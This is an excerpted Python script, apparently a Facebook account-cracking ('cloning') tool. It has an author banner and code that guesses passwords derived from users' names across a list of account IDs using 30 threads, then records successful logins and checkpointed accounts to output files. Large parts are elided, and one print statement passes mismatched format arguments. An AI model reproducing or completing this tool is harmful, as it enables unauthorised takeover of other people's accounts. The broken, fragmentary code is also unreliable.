...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : SABBIR HOSSAIN RAFI
 
\033[0;93mFACEBOOK : Md. Sabbir Hossain Rafi
 
\033[0;96mGITHUB   : Rafu0878
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mRAFU_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mRAFU_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[RAFU] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # RAFU Mahamood Hacker
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def bnsbuy():
    ...
    if to in r:
        ...
        print('\rAccount Name RAFU Mahamood\n')
        print
        print
